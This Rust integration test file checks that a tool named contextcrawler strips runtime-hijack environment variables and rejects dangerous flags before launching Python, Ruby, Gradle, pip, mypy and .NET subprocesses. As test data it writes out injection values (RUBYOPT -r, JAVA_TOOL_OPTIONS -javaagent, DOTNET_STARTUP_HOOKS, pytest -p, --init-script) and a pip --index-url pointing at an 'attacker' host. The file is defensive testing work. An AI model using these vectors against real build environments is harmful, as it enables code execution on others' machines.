//! Integration tests for issue #36 — Python / Ruby / JVM / .NET runtime
//! hardening. Each test spawns the real `contextcrawler` binary with a
//! tainted env var set, and asserts that the spawned subprocess does NOT
//! see / load / execute the attacker payload.
//!
//! Per-tool checks are gated on `which::which("<tool>")` succeeding so
//! the suite passes on CI runners that don't have every runtime
//! installed. Negative/positive arg-check tests don't need the real
//! tool and run unconditionally.

use std::path::PathBuf;
use std::process::Command;

fn binary_path() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_contextcrawler"))
}

fn tool_present(name: &str) -> bool {
    which::which(name).is_ok()
}

/// Run `contextcrawler <args>` with extra env var `key=val` set on the
/// parent so the inheritance behavior is what we're testing.
fn run_with_env(args: &[&str], envs: &[(&str, &str)]) -> std::process::Output {
    let mut cmd = Command::new(binary_path());
    cmd.args(args);
    for (k, v) in envs {
        cmd.env(k, v);
    }
    cmd.output().expect("spawn contextcrawler")
}

// ════════════════════════════════════════════════════════════════════
// Negative tests — env-var hijack must NOT reach the subprocess.
// ════════════════════════════════════════════════════════════════════

#[test]
fn pytest_pythonpath_is_not_leaked() {
    if !tool_present("pytest") && !tool_present("python3") && !tool_present("python") {
        eprintln!("skip: no python/pytest on PATH");
        return;
    }

    // Plant a sentinel that would crash any Python import if it were
    // honored (the dir contains no real modules and the path itself
    // is "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST").
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST";
    let out = run_with_env(
        &["pytest", "--version"],
        &[("PYTHONPATH", evil)],
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);

    // `pytest --version` should succeed (or at least not crash because
    // of the bogus PYTHONPATH). The critical assertion is that the
    // attacker path didn't get echoed back via some pytest debug path
    // — which would indicate it reached sys.path.
    assert!(
        !stdout.contains(evil) && !stderr.contains(evil),
        "PYTHONPATH={} leaked through to pytest. stdout={}, stderr={}",
        evil,
        stdout,
        stderr
    );
}

#[test]
fn rake_rubyopt_is_not_executed() {
    if !tool_present("rake") && !tool_present("ruby") {
        eprintln!("skip: no ruby/rake on PATH");
        return;
    }

    // RUBYOPT=-r/tmp/evil would make ruby try to `require` an
    // attacker file at startup. Use a non-existent path: if RUBYOPT
    // were honored ruby would die with "LoadError: cannot load such
    // file -- /tmp/...". If it's stripped, ruby/rake runs normally.
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST.rb";
    let out = run_with_env(
        &["rake", "--version"],
        &[("RUBYOPT", &format!("-r{}", evil))],
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);

    assert!(
        !stderr.contains("cannot load such file"),
        "RUBYOPT={} reached ruby — LoadError seen. stderr={}",
        evil,
        stderr
    );
    assert!(
        !stdout.contains(evil) && !stderr.contains(evil),
        "evil path {} leaked into rake output. stdout={}, stderr={}",
        evil,
        stdout,
        stderr
    );
}

#[test]
fn gradle_java_tool_options_is_not_loaded() {
    if !tool_present("gradle") {
        eprintln!("skip: no gradle on PATH");
        return;
    }

    // -javaagent:/path is the classic JAVA_TOOL_OPTIONS RCE vector.
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST.jar";
    let out = run_with_env(
        &["gradle", "--version"],
        &[("JAVA_TOOL_OPTIONS", &format!("-javaagent:{}", evil))],
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);

    // When JAVA_TOOL_OPTIONS reaches the JVM, it prints
    // "Picked up JAVA_TOOL_OPTIONS: ..." to stderr at startup. If
    // we stripped it correctly, that line should NOT appear.
    assert!(
        !stderr.contains("Picked up JAVA_TOOL_OPTIONS"),
        "JAVA_TOOL_OPTIONS reached the JVM. stderr={}",
        stderr
    );
    assert!(
        !stdout.contains(evil) && !stderr.contains(evil),
        "evil javaagent path leaked. stdout={}, stderr={}",
        stdout,
        stderr
    );
}

#[test]
fn dotnet_startup_hooks_is_not_loaded() {
    if !tool_present("dotnet") {
        eprintln!("skip: no dotnet on PATH");
        return;
    }

    // DOTNET_STARTUP_HOOKS=/path.dll loads an arbitrary assembly. If
    // we leak the env var to dotnet, the CLR tries to resolve the
    // assembly and emits "FileNotFoundException" in stderr.
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST.dll";
    let out = run_with_env(
        &["dotnet", "--version"],
        &[("DOTNET_STARTUP_HOOKS", evil)],
    );

    let stderr = String::from_utf8_lossy(&out.stderr);

    assert!(
        !stderr.contains("StartupHookProvider")
            && !stderr.contains("FileNotFoundException")
            && !stderr.contains(evil),
        "DOTNET_STARTUP_HOOKS reached the CLR. stderr={}",
        stderr
    );
}

// ════════════════════════════════════════════════════════════════════
// Negative tests — dangerous CLI flags must be rejected.
// ════════════════════════════════════════════════════════════════════
// These do NOT require the real tool installed: the arg check fires
// before exec, so we get exit 2 + the rejection message either way.

#[test]
fn pytest_minus_p_with_path_is_rejected() {
    let out = run_with_env(
        &["pytest", "-p", "/tmp/evil_plugin.py"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "pytest -p /tmp/evil_plugin.py should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn rubocop_require_is_rejected() {
    let out = run_with_env(
        &["rubocop", "--require", "/tmp/evil.rb"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "rubocop --require /tmp/evil.rb should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn rspec_require_is_rejected() {
    let out = run_with_env(
        &["rspec", "--require", "/tmp/evil.rb"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "rspec --require /tmp/evil.rb should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn gradle_init_script_is_rejected() {
    let out = run_with_env(
        &["gradlew", "--init-script", "/tmp/evil.gradle", "tasks"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "gradlew --init-script should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn pip_index_url_is_rejected() {
    let out = run_with_env(
        &["pip", "install", "--index-url", "http://attacker/", "requests"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "pip install --index-url should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn mypy_config_file_is_rejected() {
    let out = run_with_env(
        &["mypy", "--config-file", "/tmp/evil.ini", "src/"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "mypy --config-file should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

// ════════════════════════════════════════════════════════════════════
// Positive tests — normal invocations still work end-to-end.
// ════════════════════════════════════════════════════════════════════

#[test]
fn pytest_version_still_works() {
    if !tool_present("pytest") && !tool_present("python3") && !tool_present("python") {
        eprintln!("skip: no python/pytest on PATH");
        return;
    }
    let out = run_with_env(&["pytest", "--version"], &[]);
    // Either pytest exists and exits 0 with the version, or python -m
    // pytest is missing and exits non-zero — but in NO case should we
    // see the arg-check rejection message.
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("refusing to forward"),
        "normal `pytest --version` got rejected. stderr={}",
        stderr
    );
}

#[test]
fn dotnet_version_still_works() {
    if !tool_present("dotnet") {
        eprintln!("skip: no dotnet on PATH");
        return;
    }
    let out = run_with_env(&["dotnet", "--version"], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("refusing to forward"),
        "normal `dotnet --version` got rejected. stderr={}",
        stderr
    );
    assert!(
        out.status.success(),
        "`dotnet --version` failed: stderr={}",
        stderr
    );
}
